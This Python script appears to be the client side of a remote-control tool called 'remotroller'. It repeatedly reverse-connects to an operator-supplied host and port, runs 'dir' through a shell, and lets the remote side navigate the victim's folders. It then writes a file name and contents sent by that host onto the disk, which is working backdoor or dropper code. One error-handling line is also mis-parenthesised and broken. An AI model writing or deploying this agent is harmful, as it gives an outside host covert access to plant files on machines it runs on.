import socket,subprocess,os,sys,time,getopt,struct
port=-1
address=""
expectedArgument = len(('-a','-p')) #list of neded argument

#try to revers connect to client, return true if connection is enstablished, false if not
def tryConnection(sock, address):
    try:
        sock.connect(address)
        return True
    except:
        return False

#try every delay second to connect
def waitForConnection(sock, address, delay):
    connect = False
    while not connect:
        connect = tryConnection(sock, address)
        time.sleep(delay)
#parse input param
def getParam():
    global address
    global port

    if not len(sys.argv[1:]):
        sys.exit(0)
    try:
        op,ar = getopt.getopt(sys.argv[1:],"a:p:",["address=","port="])
    except:
        sys.exit(0)

    noOptionalArg=0
    for o,a in op:
        if o in ('-a','--address'):
            noOptionalArg+=1
            address = a
        elif o in ('-p','--port'):
            noOptionalArg+=1
            port = int(a)        

    if noOptionalArg != expectedArgument:
        sys.exit(0)

def send(data, connection):
    try:
        data = struct.pack('>I', len(data)) + data
        connection.sendall(data)
    except:
        print("remotroller> connection broken")
        sys.exit(0)

def recvall(connection, n):
    data = b''
    while len(data) < n:
        packet = connection.recv(n - len(data))
        if not packet:
            print("remotroller> connection broken")
            connection.close()
            sys.exit(0)
        data += packet
    return data


def getData(connection):
    raw_msglen = recvall(connection, 4)
    msglen = struct.unpack('>I', raw_msglen)[0]
    return recvall(connection, msglen)

def navigateFile(connection):
    send(b"remotroller> navigate to file folder and type -here", connection)
    jump = False
    run = True
    while run:
        if not jump:
            p = subprocess.Popen("dir",stdout=subprocess.PIPE,stderr=subprocess.PIPE,text=True,shell=True)
            dir,err = p.communicate()
            send((dir+err+"\n"+os.getcwd()+">").encode("utf-8"),connection)
        cm = getData(connection).decode("utf-8")
        if  cm == "-here":
            send(b"?!?bre@k?!?",connection)
            return os.getcwd()
        if cm[:2] != "cd":
            jump = True
            send(("remotroller> only <cd> command are accepted \n"+os.getcwd()+">").encode("utf-8"),connection)
        else:
            jump = False
            try:
                os.chdir(cm[2:].replace(" ","",1))
            except FileNotFoundError as e:
                send(("remotroller> ERROR: "+str(e).encode("utf-8"),connection))

if __name__ == "__main__":
    getParam()
    client=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    waitForConnection(client,(address,port),1)
    fileName = getData(client).decode("utf-8")
    path = navigateFile(client)
    data = getData(client).decode("utf-8")
    with open(path+"\\"+fileName,"w+") as f:
        f.write(data)